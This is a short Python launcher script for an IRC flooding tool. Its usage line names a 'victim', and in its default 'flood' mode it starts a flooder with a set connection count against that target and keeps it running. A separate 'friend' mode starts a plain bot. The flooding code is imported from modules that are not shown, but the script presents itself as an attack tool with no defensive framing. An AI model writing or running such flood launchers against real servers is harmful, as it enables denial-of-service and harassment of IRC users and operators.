#!/bin/python3.7
# -*- coding: cp1251 -*-
import sys
from irc import overlay
from irc import guesser
import configparser


def main():
 typ = "flood"
 count = 30
 port=6667
 if len(sys.argv) < 4:
  print (sys.argv[0]+" addr victim port")
  sys.exit()
 for arg in sys.argv:
  if "-type" in arg:
    typ=arg.split('=')[1]
  elif "-count" in arg:
    count=int(arg.split('=')[1])
  elif "-port" in arg:
   port = int(arg.split('=')[1])
 if typ=="flood":
  print("Start in flood mode")
  a=guesser.Guesser_Flooder(sys.argv[1], sys.argv[2], sys.argv[3],count=count,port=port)
  while True:
   pass
 elif typ=="friend":
  print("Start as just bot")
  config = configparser.ConfigParser()
  config.read("config.ini")
  config = config["BOT"]
  irc = guesser.guesser(sys.argv[1],sys.argv[2],sys.argv[3], port=port)
main()